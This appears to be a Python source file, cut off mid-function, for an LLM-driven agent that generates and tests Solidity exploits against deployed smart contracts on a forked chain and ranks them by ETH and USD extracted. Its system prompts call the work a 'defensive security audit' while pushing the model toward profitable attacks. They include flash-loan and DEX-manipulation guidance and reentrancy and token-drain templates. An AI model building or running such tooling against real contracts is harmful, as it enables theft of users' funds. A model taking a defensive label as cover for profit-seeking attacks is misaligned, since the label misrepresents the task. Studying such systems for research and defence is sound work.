"""
Main A1 Agent implementation
"""

import re
import json
import logging
import asyncio
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path

from .config import Config
from .llm_client import LLMClient
from .tool_calling_llm_client import ToolCallingLLMClient
from .tool_calling import ToolCallManager
from .tools.base import ToolResult
from .tools import (
    SourceCodeFetcher,
    ConstructorParameterTool,
    StateReaderTool,
    CodeSanitizerTool,
    ConcreteExecutionTool,
    RevenueNormalizerTool,  # Paper-compliant revenue calculation
    ComprehensiveValueDetector,  # Updated import
    FlashLoanTool,
    DEXLiquidityTool
)


@dataclass
class AnalysisResult:
    """Result of contract analysis"""
    success: bool
    profitable: bool
    exploit_found: bool = False  # Whether any exploit was found (regardless of profitability)
    exploit_code: Optional[str] = None
    revenue_eth: float = 0.0
    revenue_usd: float = 0.0
    iterations: int = 0
    total_cost: float = 0.0
    execution_time: float = 0.0
    vulnerability_type: Optional[str] = None
    error_message: Optional[str] = None


@dataclass
class IterationAnalysis:
    """Analysis and learning from a single iteration"""
    iteration: int
    reasoning_stage_1: str  # Contract understanding scratchpad
    reasoning_stage_2: str  # Vulnerability hypotheses 
    reasoning_stage_3: str  # Investigation results
    exploit_strategy: str   # Summary of approach tried
    exploit_code: Optional[str]
    execution_result: Optional[Dict]
    lessons_learned: str    # What this iteration taught us
    remaining_hypotheses: List[str]  # Unexplored attack vectors
    tool_usage: List[str]   # Tools that were called
    timestamp: str


@dataclass
class ContractContext:
    """Context for contract analysis with iteration memory"""
    chain_id: int
    contract_address: str
    block_number: int
    source_code: Optional[str] = None
    sanitized_code: Optional[str] = None
    state_data: Optional[Dict] = None
    constructor_params: Optional[Dict] = None
    feedback_history: List[str] = None
    successful_exploits: List[Dict] = None  # Track working but unprofitable exploits
    iteration_analyses: List[IterationAnalysis] = None  # NEW: Store detailed iteration analysis
    
    def __post_init__(self):
        if self.feedback_history is None:
            self.feedback_history = []
        if self.successful_exploits is None:
            self.successful_exploits = []
        if self.iteration_analyses is None:
            self.iteration_analyses = []
    
    def add_feedback(self, feedback: str):
        self.feedback_history.append(feedback)
    
    def add_successful_exploit_attempt(self, exploit_code: str, execution_data: Dict):
        """Track exploits that executed successfully but weren't profitable"""
        self.successful_exploits.append({
            "exploit_code": exploit_code,
            "execution_data": execution_data,
            "timestamp": datetime.now().isoformat()
        })
    
    def add_iteration_analysis(self, analysis: IterationAnalysis):
        """Store detailed analysis from each iteration"""
        self.iteration_analyses.append(analysis)
    
    def get_previous_learnings(self) -> str:
        """Get formatted summary of previous iteration learnings"""
        if not self.iteration_analyses:
            return ""
        
        learnings = []
        learnings.append("=== PREVIOUS ITERATION LEARNINGS ===")
        
        for analysis in self.iteration_analyses:
            learnings.append(f"\n--- ITERATION {analysis.iteration} ---")
            learnings.append(f"APPROACH TRIED: {analysis.exploit_strategy}")
            
            if analysis.execution_result:
                success = analysis.execution_result.get('exploit_executed_successfully', False)
                profitable = analysis.execution_result.get('profitable', False)
                error = analysis.execution_result.get('error_message', 'Unknown error')
                
                if success and profitable:
                    revenue = analysis.execution_result.get('eth_gained', 0)
                    learnings.append(f"RESULT: ✅ SUCCESS - Profitable exploit found! Revenue: {revenue} ETH")
                elif success and not profitable:
                    learnings.append(f"RESULT: ⚠️ Exploit executed but not profitable")
                else:
                    learnings.append(f"RESULT: ❌ FAILED - {error}")
            
            learnings.append(f"LESSONS LEARNED: {analysis.lessons_learned}")
            
            if analysis.remaining_hypotheses:
                learnings.append(f"UNEXPLORED VECTORS: {', '.join(analysis.remaining_hypotheses)}")
        
        return "\n".join(learnings)
    
    def get_full_context(self, iteration: int = 0) -> str:
        """Get formatted context for LLM including iteration memory"""
        context_parts = []
        
        if self.source_code:
            context_parts.append(f"=== CONTRACT SOURCE CODE ===\n{self.sanitized_code or self.source_code}")
        
        if self.constructor_params:
            context_parts.append(f"=== CONSTRUCTOR PARAMETERS ===\n{json.dumps(self.constructor_params, indent=2)}")
        
        if self.state_data:
            context_parts.append(f"=== CONTRACT STATE ===\n{json.dumps(self.state_data, indent=2)}")
        
        # Add previous learnings for iteration 2+
        if iteration > 1:
            previous_learnings = self.get_previous_learnings()
            if previous_learnings:
                context_parts.append(previous_learnings)
        
        return "\n\n".join(context_parts)


class A1Agent:
    """
    Main A1 agent for autonomous exploit generation
    """
    
    def __init__(self, config: Config):
        self.config = config
        self.llm_client = LLMClient(config)
        self.logger = logging.getLogger(__name__)
        self.total_cost = 0.0
        self.run_dir = None
        
        # Initialize tools
        self.tools = {
            "source_fetcher": SourceCodeFetcher(config),
            "constructor_tool": ConstructorParameterTool(config),
            "state_reader": StateReaderTool(config),
            "code_sanitizer": CodeSanitizerTool(config),
            "execution_tool": ConcreteExecutionTool(config),
            "revenue_tool": RevenueNormalizerTool(config),  # Paper-compliant revenue calculation
            "value_detector": ComprehensiveValueDetector(config),  # Updated tool
            "flash_loan_tool": FlashLoanTool(config),
            "dex_liquidity_tool": DEXLiquidityTool(config)
        }
        
        # Initialize tool calling system
        analysis_tools = [
            self.tools["flash_loan_tool"],
            self.tools["dex_liquidity_tool"]
        ]
        self.tool_manager = ToolCallManager(tools=analysis_tools)
        self.tool_calling_client = ToolCallingLLMClient(config, self.tool_manager)
        
        self.logger.info("A1 Agent initialized with tool calling capabilities")
        self.logger.info(f"🔧 Registered tools for LLM: {self.tool_manager.registry.list_tools()}")
        
        # Initialize Web3 client
        from .web3_client import Web3Client
        self.web3_client = Web3Client(config)
    
    def _setup_run_directory(self, chain_id: int, contract_address: str) -> Path:
        """Create persistent directory for this analysis run"""
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        contract_short = contract_address[:10] + "..."
        run_name = f"{timestamp}_{contract_short}"
        
        # Create runs directory if it doesn't exist
        runs_dir = Path("runs")
        runs_dir.mkdir(exist_ok=True)
        
        # Create this run's directory
        run_dir = runs_dir / run_name
        run_dir.mkdir(exist_ok=True)
        
        # Create subdirectories
        (run_dir / "iterations").mkdir(exist_ok=True)
        
        # Setup file logging for this run
        log_file = run_dir / "run_log.txt"
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(formatter)
        
        # Add file handler to all relevant loggers
        loggers_to_setup = [
            logging.getLogger(__name__),
            logging.getLogger('a1_system.tools.execution_tool'),
            logging.getLogger('a1_system.llm_client'),
            logging.getLogger('a1_system.tools.source_fetcher'),
            logging.getLogger('a1_system.tools.state_reader')
        ]
        
        for logger in loggers_to_setup:
            logger.addHandler(file_handler)
        
        self.logger.info(f"Analysis run started: {run_dir}")
        self.logger.info(f"Target: Chain {chain_id}, Contract {contract_address}")
        
        return run_dir

    async def analyze_contract(
        self,
        chain_id: int,
        contract_address: str,
        block_number: Optional[int] = None
    ) -> AnalysisResult:
        """
        Main entry point for contract analysis
        
        Args:
            chain_id: Blockchain ID (1=Ethereum, 56=BSC)
            contract_address: Contract address to analyze
            block_number: Historical block to fork from (latest if None)
        
        Returns:
            AnalysisResult with findings
        """
        start_time = datetime.now()
        
        try:
            # Setup run directory and logging
            self.run_dir = self._setup_run_directory(chain_id, contract_address)
            self.logger.info(f"Analysis run started: {self.run_dir}")
            self.logger.info(f"Target: Chain {chain_id}, Contract {contract_address}")
            
            # Create contract context
            context = ContractContext(
                chain_id=chain_id,
                contract_address=contract_address,
                block_number=block_number or await self._get_latest_block(chain_id)
            )
            
            # Save run metadata
            self._save_run_metadata(context, start_time)
            
            # Gather initial context
            await self._gather_context(context)
            
            # Assemble full context for LLM
            full_context = context.get_full_context()
            self.logger.info(f"📋 Full context assembled: {len(full_context)} characters")
            
            # Iterative exploit generation
            for iteration in range(1, self.config.max_iterations + 1):
                self.logger.info(f"Starting iteration {iteration}/{self.config.max_iterations}")
                
                # Create iteration directory
                iteration_dir = self.run_dir / "iterations" / f"iteration_{iteration}"
                iteration_dir.mkdir(exist_ok=True)
                
                # Generate exploit
                exploit_code = await self._generate_exploit(context, iteration)
                
                if not exploit_code:
                    self.logger.warning(f"Iteration {iteration}: No exploit code generated")
                    continue
                
                # Save generated exploit code
                exploit_file = iteration_dir / "exploit.sol"
                exploit_file.write_text(exploit_code)
                self.logger.info(f"Saved exploit code to: {exploit_file}")
                
                # Execute and validate exploit
                execution_result = await self._execute_exploit(exploit_code, context, iteration_dir)
                
                # Check if exploit executed successfully (regardless of profitability)
                exploit_executed = execution_result.success and execution_result.data.get("exploit_executed_successfully", False)
                is_profitable = execution_result.success and execution_result.data.get("profitable", False)
                
                if exploit_executed and is_profitable:
                    # Both successful execution AND profitable - enhance revenue analysis
                    revenue_result = await self._normalize_revenue(execution_result, context)
                    
                    # Enhanced profitability check using comprehensive value detector results
                    final_is_profitable = revenue_result.data.get("is_profitable", False)
                    final_revenue_eth = revenue_result.data.get("total_value_eth", execution_result.data.get("eth_gained", 0.0))
                    final_revenue_usd = revenue_result.data.get("total_value_usd", 0.0)
                    
                    self.logger.info(f"🎯 Revenue analysis complete: {final_revenue_eth:.6f} ETH (${final_revenue_usd:.2f}) - Profitable: {final_is_profitable}")
                    
                    # If value detector confirms profitability OR execution tool found value, consider it profitable
                    if final_is_profitable or execution_result.data.get("eth_gained", 0.0) > 0:
                        # Found a profitable exploit - track it and continue to see if we can find better ones
                        context.add_successful_exploit_attempt(exploit_code, {
                            **execution_result.data,
                            "final_revenue_eth": final_revenue_eth,
                            "final_revenue_usd": final_revenue_usd,
                            "iteration": iteration
                        })
                        
                        self.logger.info(f"✅ Profitable exploit found in iteration {iteration}! Revenue: {final_revenue_eth:.6f} ETH (${final_revenue_usd:.2f})")
                        self.logger.info(f"🔄 Continuing to iteration {iteration + 1} to search for potentially better exploits...")
                        
                        # Save iteration summary for this successful exploit
                        self._save_iteration_summary(iteration, exploit_code, execution_result, iteration_dir)
                        
                        # Continue to next iteration instead of returning immediately
                        # (We'll return the best one after all iterations)
                    else:
                        # Value detector disagrees with execution tool - continue looking
                        self.logger.warning("🤔 Execution tool found profitable exploit but value detector disagrees - continuing search")
                        context.add_successful_exploit_attempt(exploit_code, execution_result.data)
                elif exploit_executed and not is_profitable:
                    # Exploit executed successfully but not profitable - continue to look for profitable exploit
                    self.logger.info("⚠️ Exploit executed successfully but not profitable - continuing to search for profitable exploit")
                    context.add_successful_exploit_attempt(exploit_code, execution_result.data)
                elif not exploit_executed:
                    # Exploit failed to execute - continue to next iteration
                    self.logger.info("❌ Exploit failed to execute properly")
                
                # Add feedback for next iteration
                feedback = self._format_feedback(execution_result)
                context.add_feedback(feedback)
                
                # Store detailed iteration analysis for learning
                iteration_analysis = IterationAnalysis(
                    iteration=iteration,
                    reasoning_stage_1="",  # TODO: Extract from LLM response
                    reasoning_stage_2="",  # TODO: Extract from LLM response
                    reasoning_stage_3="",  # TODO: Extract from LLM response
                    exploit_strategy=self._summarize_exploit_strategy(exploit_code),
                    exploit_code=exploit_code,
                    execution_result=execution_result.data if execution_result.success else {"error": execution_result.error_message},
                    lessons_learned=self._generate_lessons_learned(execution_result, exploit_executed, is_profitable),
                    remaining_hypotheses=[],  # TODO: Extract from LLM response
                    tool_usage=[],  # TODO: Track tool usage
                    timestamp=datetime.now().isoformat()
                )
                context.add_iteration_analysis(iteration_analysis)
                
                # Save iteration summary for non-profitable exploits too
                if not (exploit_executed and is_profitable and ('final_is_profitable' in locals() and (final_is_profitable or execution_result.data.get("eth_gained", 0.0) > 0))):
                    self._save_iteration_summary(iteration, exploit_code, execution_result, iteration_dir)
            
            # After all iterations, check if we found any profitable exploits
            execution_time = (datetime.now() - start_time).total_seconds()
            
            # Find the best profitable exploit from all attempts
            profitable_exploits = [
                exploit for exploit in context.successful_exploits 
                if exploit["execution_data"].get("final_revenue_eth", 0) > 0 or 
                   exploit["execution_data"].get("eth_gained", 0) > 0
            ]
            
            if profitable_exploits:
                # Return the most profitable exploit
                best_exploit = max(
                    profitable_exploits, 
                    key=lambda x: x["execution_data"].get("final_revenue_eth", x["execution_data"].get("eth_gained", 0))
                )
                
                exploit_data = best_exploit["execution_data"]
                final_revenue_eth = exploit_data.get("final_revenue_eth", exploit_data.get("eth_gained", 0.0))
                final_revenue_usd = exploit_data.get("final_revenue_usd", 0.0)
                best_iteration = exploit_data.get("iteration", self.config.max_iterations)
                
                self.logger.info(f"🎉 Best exploit found in iteration {best_iteration}: {final_revenue_eth:.6f} ETH (${final_revenue_usd:.2f})")
                
                result = AnalysisResult(
                    success=True,
                    profitable=True,
                    exploit_found=True,
                    exploit_code=best_exploit["exploit_code"],
                    revenue_eth=final_revenue_eth,
                    revenue_usd=final_revenue_usd,
                    iterations=self.config.max_iterations,  # Completed all iterations
                    total_cost=self.total_cost,
                    execution_time=execution_time,
                    vulnerability_type=self._classify_vulnerability(best_exploit["exploit_code"])
                )
                
                # Save final results
                self._save_final_results(result, context)
                return result
            
            # No profitable exploit found - check if any exploits were found
            exploits_found = len(context.successful_exploits) > 0
            
            if exploits_found:
                error_message = f"Found {len(context.successful_exploits)} working exploit(s) but none were profitable"
                self.logger.info(f"🔍 Analysis complete: {len(context.successful_exploits)} working exploits found but none profitable")
            else:
                error_message = "No working exploits found within iteration limit"
                self.logger.info("❌ Analysis complete: No working exploits found")
            
            result = AnalysisResult(
                success=False,
                profitable=False,
                exploit_found=exploits_found,
                iterations=self.config.max_iterations,
                total_cost=self.total_cost,
                execution_time=execution_time,
                error_message=error_message
            )
            
            # Save final results
            self._save_final_results(result, context)
            return result
            
        except ValueError as e:
            # Handle missing source code or other validation errors
            execution_time = (datetime.now() - start_time).total_seconds()
            error_message = str(e)
            
            self.logger.error(f"Validation error: {error_message}")
            result = AnalysisResult(
                success=False,
                profitable=False,
                total_cost=self.total_cost,
                execution_time=execution_time,
                error_message=error_message
            )
            
            if self.run_dir:
                self._save_final_results(result, context if 'context' in locals() else None)
            
            return result
            
        except Exception as e:
            execution_time = (datetime.now() - start_time).total_seconds()
            self.logger.error(f"Analysis failed: {str(e)}")
            result = AnalysisResult(
                success=False,
                profitable=False,
                total_cost=self.total_cost,
                execution_time=execution_time,
                error_message=str(e)
            )
            
            if self.run_dir:
                self._save_final_results(result, context if 'context' in locals() else None)
            
            return result

    def _save_run_metadata(self, context: ContractContext, start_time: datetime):
        """Save metadata about this analysis run"""
        metadata = {
            "start_time": start_time.isoformat(),
            "chain_id": context.chain_id,
            "contract_address": context.contract_address,
            "block_number": context.block_number,
            "config": {
                "max_iterations": self.config.max_iterations,
                "model": self.config.default_model,
                "temperature": self.config.temperature
            }
        }
        
        metadata_file = self.run_dir / "metadata.json"
        metadata_file.write_text(json.dumps(metadata, indent=2))

    def _save_iteration_summary(self, iteration: int, exploit_code: str, execution_result, iteration_dir: Path):
        """Save summary of this iteration"""
        summary = {
            "iteration": iteration,
            "exploit_generated": bool(exploit_code),
            "execution_success": execution_result.success,
            "exploit_executed_successfully": execution_result.data.get("exploit_executed_successfully", False) if execution_result.success else False,
            "profitable": execution_result.data.get("profitable", False) if execution_result.success else False,
            "gas_used": execution_result.data.get("gas_used", 0) if execution_result.success else 0,
            "eth_gained": execution_result.data.get("eth_gained", 0.0) if execution_result.success else 0.0,
            "tokens_extracted": sum(execution_result.data.get("tokens_extracted", {}).values()) if execution_result.success else 0,
            "error": execution_result.error_message if not execution_result.success else None
        }
        
        summary_file = iteration_dir / "summary.json"
        summary_file.write_text(json.dumps(summary, indent=2))

    def _save_final_results(self, result: AnalysisResult, context: Optional[ContractContext]):
        """Save final analysis results"""
        results_data = {
            "success": result.success,
            "profitable": result.profitable,
            "exploit_found": result.exploit_found,
            "revenue_eth": result.revenue_eth,
            "revenue_usd": result.revenue_usd,
            "iterations_completed": result.iterations,
            "total_cost": result.total_cost,
            "execution_time": result.execution_time,
            "vulnerability_type": result.vulnerability_type,
            "error_message": result.error_message,
            "timestamp": datetime.now().isoformat()
        }
        
        if context:
            results_data["contract_info"] = {
                "chain_id": context.chain_id,
                "address": context.contract_address,
                "block_number": context.block_number
            }
        
        summary_file = self.run_dir / "final_results.json"
        summary_file.write_text(json.dumps(results_data, indent=2))
        
        self.logger.info(f"Final results saved to: {summary_file}")

    async def _execute_exploit(self, exploit_code: str, context: ContractContext, iteration_dir: Path) -> ToolResult:
        """Execute exploit using concrete execution tool with proper artifact saving"""
        
        # Pass iteration directory to execution tool for artifact saving
        result = await self.tools["execution_tool"].execute({
            "exploit_code": exploit_code,
            "chain_id": context.chain_id,
            "target_address": context.contract_address,
            "block_number": context.block_number,
            "iteration_dir": iteration_dir  # Pass directory for saving artifacts
        })
        
        return result

    async def _gather_context(self, context: ContractContext):
        """Gather initial context about the contract"""
        
        self.logger.info("🔍 Starting context gathering...")
        
        # 1. Fetch source code
        self.logger.info("📥 Fetching source code...")
        source_result = await self.tools["source_fetcher"].execute({
            "chain_id": context.chain_id,
            "contract_address": context.contract_address,
            "block_number": context.block_number
        })
        
        if source_result.success:
            context.source_code = source_result.data.get("source_code")
            self.logger.info(f"✅ Source code fetched: {len(context.source_code or '')} characters")
            self.logger.debug(f"Source code preview: {(context.source_code or '')[:500]}...")
            
            # ENHANCEMENT: Save source code to file for analysis
            if context.source_code and self.run_dir:
                contract_name = source_result.data.get("contract_name", "Unknown")
                source_file = self.run_dir / f"{contract_name}_source.sol"
                source_file.write_text(context.source_code)
                self.logger.info(f"💾 Source code saved to: {source_file}")
        else:
            self.logger.error(f"❌ Source code fetch failed: {source_result.error_message}")
            
        # **CRITICAL CHECK**: Stop immediately if no source code
        if not context.source_code or len(context.source_code.strip()) == 0:
            error_msg = "Cannot analyze contract without verified source code. Skipping."
            self.logger.error(f"🛑 {error_msg}")
            raise ValueError(error_msg)
        
        # 2. Get constructor parameters
        self.logger.info("🔧 Fetching constructor parameters...")
        constructor_result = await self.tools["constructor_tool"].execute({
            "chain_id": context.chain_id,
            "contract_address": context.contract_address
        })
        
        if constructor_result.success:
            context.constructor_params = constructor_result.data
            self.logger.info(f"✅ Constructor params: {len(context.constructor_params or {})} items")
            self.logger.debug(f"Constructor params: {context.constructor_params}")
        else:
            self.logger.warning(f"⚠️ Constructor params failed: {constructor_result.error_message}")
        
        # 3. Read contract state
        self.logger.info("📊 Reading contract state...")
        state_result = await self.tools["state_reader"].execute({
            "chain_id": context.chain_id,
            "contract_address": context.contract_address,
            "block_number": context.block_number
        })
        
        if state_result.success:
            context.state_data = state_result.data
            self.logger.info(f"✅ Contract state: {len(context.state_data or {})} items")
            self.logger.debug(f"Contract state: {context.state_data}")
        else:
            self.logger.warning(f"⚠️ Contract state failed: {state_result.error_message}")
        
        # 4. Sanitize source code for focused analysis
        self.logger.info("🧹 Sanitizing source code...")
        sanitizer_result = await self.tools["code_sanitizer"].execute({
            "source_code": context.source_code
        })
        
        if sanitizer_result.success:
            context.sanitized_code = sanitizer_result.data.get("sanitized_code")
            self.logger.info(f"✅ Sanitized code: {len(context.sanitized_code or '')} characters")
            self.logger.debug(f"Sanitized code preview: {(context.sanitized_code or '')[:500]}...")
            
            # ENHANCEMENT: Save sanitized code to file for analysis
            if context.sanitized_code and self.run_dir:
                contract_name = source_result.data.get("contract_name", "Unknown")
                sanitized_file = self.run_dir / f"{contract_name}_sanitized.sol"
                sanitized_file.write_text(context.sanitized_code)
                self.logger.info(f"💾 Sanitized code saved to: {sanitized_file}")
        else:
            self.logger.warning(f"⚠️ Code sanitization failed: {sanitizer_result.error_message}")
            # Use original source if sanitization fails
            context.sanitized_code = context.source_code
        
        # 5. Log the full context that will be sent to LLM
        full_context = context.get_full_context()
        self.logger.info(f"📋 Full context assembled: {len(full_context)} characters")
        self.logger.debug(f"Full context preview:\n{full_context[:1000]}...")
        
        # ENHANCEMENT: Save full context to file for analysis
        if self.run_dir:
            context_file = self.run_dir / "llm_context.txt"
            context_file.write_text(full_context)
            self.logger.info(f"💾 Full LLM context saved to: {context_file}")
        
        if not context.source_code:
            self.logger.error("🚨 CRITICAL: No source code in context - LLM will be blind!")
        if not context.state_data:
            self.logger.warning("🚨 WARNING: No contract state in context")

    async def _generate_exploit(self, context: ContractContext, iteration: int) -> Optional[str]:
        """Generate exploit code using multi-stage reasoning with iteration memory"""
        
        self.logger.info(f"🧠 Generating exploit with multi-stage reasoning (iteration {iteration})...")
        
        # Log what context we have available
        has_source = bool(context.source_code)
        has_sanitized = bool(context.sanitized_code)
        has_state = bool(context.state_data)
        has_constructor = bool(context.constructor_params)
        
        self.logger.info(f"📋 Context availability: source={has_source}, sanitized={has_sanitized}, state={has_state}, constructor={has_constructor}")
        
        if not has_source:
            self.logger.error("🚨 CRITICAL: Generating exploit WITHOUT source code - this will be blind guessing!")

        # Use different prompt for iteration 1 vs 2+
        if iteration == 1:
            return await self._generate_first_iteration_exploit(context, iteration)
        else:
            return await self._generate_iterative_exploit(context, iteration)

        # This method now delegates to iteration-specific methods
        pass

    async def _generate_first_iteration_exploit(self, context: ContractContext, iteration: int) -> Optional[str]:
        """Generate exploit using fresh multi-stage reasoning for first iteration"""
        
        system_prompt = """You are conducting a defensive security audit to identify vulnerabilities in smart contracts. Your goal is to help protect this contract by discovering potential security issues before malicious actors can exploit them.

MULTI-STAGE REASONING APPROACH:
You must think systematically through three stages. Use the scratchpad format to show your reasoning.

=== STAGE 1: CONTRACT UNDERSTANDING ===
First, thoroughly understand the contract before looking for vulnerabilities:

CONTRACT UNDERSTANDING SCRATCHPAD:
==================================
PRIMARY PURPOSE: What is this contract designed to do?
KEY FUNCTIONS: What are the main functions and their intended roles?
VALUE FLOW: How do tokens/ETH move through the contract?
ACCESS CONTROL: Who can call which functions? What permissions exist?
STATE CHANGES: How does the contract state evolve over time?
EXTERNAL DEPENDENCIES: What external contracts or data does it rely on?
ASSUMPTIONS: What assumptions does the contract make about user behavior or external state?

=== STAGE 2: VULNERABILITY HYPOTHESIS GENERATION ===
Based on your understanding, brainstorm potential vulnerabilities creatively:

VULNERABILITY HYPOTHESIS SCRATCHPAD:
===================================
SUSPICIOUS PATTERNS: What code patterns or logic seem risky or unusual?
EDGE CASES: What unusual inputs, states, or sequences could cause problems?
ASSUMPTION VIOLATIONS: What happens if the contract's assumptions are violated?
FUNCTION INTERACTIONS: How might functions interact in unexpected ways?
MATHEMATICAL OPERATIONS: Are calculations safe from precision/overflow issues?
ACCESS CONTROL GAPS: Are there authorization weaknesses or missing checks?
ECONOMIC INCENTIVES: Could attackers profit by manipulating the contract's economics?

For each hypothesis, explain WHY you think it might be vulnerable.

=== STAGE 3: INVESTIGATION & EXPLOITATION ===
Now investigate your most promising hypotheses:

INVESTIGATION SCRATCHPAD:
========================
For each hypothesis:
1. EVIDENCE: What specific code evidence supports this vulnerability?
2. EXPLOITABILITY: Can this actually be exploited? How?
3. PRECONDITIONS: What conditions must be met for exploitation?
4. ECONOMIC IMPACT: What value could be extracted?
5. TOOL USAGE: Would flash loans or DEX manipulation amplify this exploit?

Generate a concrete exploit for the most promising vulnerability you find.

TOOL USAGE GUIDANCE:
===================
Use tools when they would enhance your analysis:

**flash_loan_tool**: Use when you identify economic attacks requiring large capital:
- Price manipulation requiring significant liquidity
- Arbitrage opportunities across protocols
- Attacks that need substantial token amounts
- Expected profit > $1000 suggests capital-intensive exploit

**dex_liquidity_tool**: Use when you find price manipulation vulnerabilities:
- Token price calculations based on liquidity pools
- Slippage or price impact attacks
- MEV opportunities like sandwich attacks
- DEX integration points that could be manipulated

CRITICAL: Think creatively and don't just look for common patterns. Each contract is unique.

TECHNICAL REQUIREMENTS:
======================
Your exploit MUST compile and execute correctly. Follow these requirements:

**INTERFACE ACCESS:**
If you need to call token functions (balanceOf, transfer, etc.), use low-level calls:
```solidity
// CORRECT: Low-level call
(bool success, bytes memory data) = target.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
uint256 balance = abi.decode(data, (uint256));

// WRONG: Don't use IERC20(target) - interface not imported
```

**AVAILABLE CONTEXT:**
- No vm.deal(), vm.prank(), etc. available in exploit contract
- No interface imports (IERC20, etc.) - use low-level calls
- Use abi.encodeWithSignature() for function calls
- Address values should be exact from source code

**EXPLOIT TEMPLATES:**

**Basic Exploit:**
```solidity
contract ExploitContract {
    address target = 0xTARGET_CONTRACT_ADDRESS;
    
    function exploit() external {
        // Call vulnerable function with low-level call
        (bool success,) = target.call(abi.encodeWithSignature("vulnerableFunction()"));
        require(success, "Exploit failed");
    }
}
```

**Reentrancy Exploit:**
```solidity
contract ExploitContract {
    address target = 0xTARGET_CONTRACT_ADDRESS;
    uint256 public attackCount;
    
    function exploit() external payable {
        // Initial call to vulnerable function
        target.call{value: msg.value}(abi.encodeWithSignature("vulnerableFunction()"));
    }
    
    // Reentrancy callback (fallback or receive)
    fallback() external payable {
        if (attackCount < 5 && address(target).balance > 0) {
            attackCount++;
            target.call(abi.encodeWithSignature("withdraw()"));
        }
    }
}
```

**Token Manipulation:**
```solidity
contract ExploitContract {
    address target = 0xTARGET_CONTRACT_ADDRESS;
    
    function exploit() external {
        // Call mint/transfer/etc. with low-level calls
        (bool success,) = target.call(abi.encodeWithSignature("mint()"));
        require(success, "Mint failed");
        
        // Get balance using low-level call
        (bool balSuccess, bytes memory balData) = target.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        require(balSuccess, "Balance check failed");
        uint256 balance = abi.decode(balData, (uint256));
        
        // Transfer tokens using low-level call
        if (balance > 0) {
            target.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, balance));
        }
    }
}
```"""

        user_prompt = f"""
CONTRACT ANALYSIS TARGET:
Chain ID: {context.chain_id}
Contract: {context.contract_address}
Block: {context.block_number}
Iteration: {iteration}

{context.get_full_context(iteration)}

Generate an exploit contract that demonstrates a vulnerability in this contract. Focus on finding real logic flaws, access control issues, or other security vulnerabilities that could be exploited.
"""
        
        return await self._execute_reasoning_with_tools(system_prompt, user_prompt, iteration)

    async def _generate_iterative_exploit(self, context: ContractContext, iteration: int) -> Optional[str]:
        """Generate exploit using reflection and learning from previous iterations"""
        
        system_prompt = """You are conducting a defensive security audit to identify vulnerabilities in smart contracts. You have already attempted to find vulnerabilities in previous iterations.

REFLECTION AND LEARNING APPROACH:
Learn from previous attempts and try different attack vectors.

=== STEP 1: ANALYZE PREVIOUS ATTEMPTS ===
Review what approaches were tried before and why they failed:

PREVIOUS ATTEMPT ANALYSIS:
=========================
- What vulnerabilities were explored in previous iterations?
- Why did the previous exploits fail? (compilation, execution, not profitable)
- What does this teach us about the contract's defenses or structure?
- What assumptions were incorrect?

=== STEP 2: GENERATE NEW HYPOTHESES ===
Based on learnings, brainstorm different attack vectors:

NEW HYPOTHESIS SCRATCHPAD:
==========================
UNEXPLORED AREAS: What parts of the contract haven't been thoroughly analyzed?
DIFFERENT APPROACHES: What alternative attack strategies could work?
ECONOMIC FACTORS: Could the issue be economic viability rather than technical exploit?
TOOL USAGE: Should we use flash loans or DEX manipulation for this attack?
INTERACTION SCENARIOS: Are there multi-step or multi-function attacks possible?

=== STEP 3: FOCUSED INVESTIGATION ===
Investigate the most promising new hypotheses:

INVESTIGATION SCRATCHPAD:
========================
For each new hypothesis:
1. EVIDENCE: What specific code evidence supports this vulnerability?
2. DIFFERENCE: How is this different from previous attempts?
3. EXPLOITABILITY: Can this actually be exploited? How?
4. ECONOMIC VIABILITY: Will this be profitable given the contract's current state?

Generate a concrete exploit for the most promising new vulnerability.

TOOL USAGE GUIDANCE:
Use economic tools if you identify capital-intensive attacks:
- **flash_loan_tool** for large capital requirements
- **dex_liquidity_tool** for price manipulation attacks

TECHNICAL REQUIREMENTS - CRITICAL:
=================================
Learn from previous compilation/execution failures:

**AVOID COMMON ERRORS:**
- Don't use IERC20(target) - interface not imported
- Don't use vm.sign(), vm.deal(), vm.prank() - not available in exploit contracts
- Use low-level calls: target.call(abi.encodeWithSignature(...))
- Check previous iteration errors and fix them

**WORKING EXPLOIT EXAMPLES:**

**Basic Function Call:**
```solidity
contract ExploitContract {
    address target = 0xTARGET_CONTRACT_ADDRESS;
    
    function exploit() external {
        (bool success,) = target.call(abi.encodeWithSignature("mint()"));
        require(success, "Exploit failed");
    }
}
```

**Token Balance Check:**
```solidity
contract ExploitContract {
    address target = 0xTARGET_CONTRACT_ADDRESS;
    
    function exploit() external {
        // Get balance using low-level call
        (bool success, bytes memory data) = target.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        require(success, "Balance check failed");
        uint256 balance = abi.decode(data, (uint256));
    }
}
```"""

        user_prompt = f"""
CONTRACT ANALYSIS TARGET:
Chain ID: {context.chain_id}
Contract: {context.contract_address}
Block: {context.block_number}
Iteration: {iteration}

{context.get_full_context(iteration)}

Based on the previous iteration learnings, generate a NEW exploit that tries a different vulnerability or approach. DO NOT repeat the same approach that already failed.
"""
        
        return await self._execute_reasoning_with_tools(system_prompt, user_prompt, iteration)

    async def _execute_reasoning_with_tools(self, system_prompt: str, user_prompt: str, iteration: int) -> Optional[str]:
        """Execute LLM reasoning with tool calling support"""
        
        # Log the actual prompt being sent to LLM
        user_prompt_len = len(user_prompt)
        system_prompt_len = len(system_prompt)
        
        self.logger.info(f"📤 Sending to LLM: system_prompt={system_prompt_len} chars, user_prompt={user_prompt_len} chars")
        self.logger.debug(f"User prompt preview:\n{user_prompt[:2000]}...")

        try:
            # Use tool calling client for enhanced analysis
            tool_result = await self.tool_calling_client.generate_with_tools(
                system_prompt=system_prompt,
                user_prompt=user_prompt,
                enable_tools=True
            )
            
            response = tool_result["response"]
            tool_calls = tool_result["tool_calls"]
            tool_iterations = tool_result["iterations"]
            tool_cost = tool_result["total_cost"]
            
            self.logger.info(f"📥 Tool-calling response: {len(response)} chars, {len(tool_calls)} tool calls, {tool_iterations} iterations")
            self.logger.info(f"💰 Tool calling cost: ${tool_cost:.4f}")
            
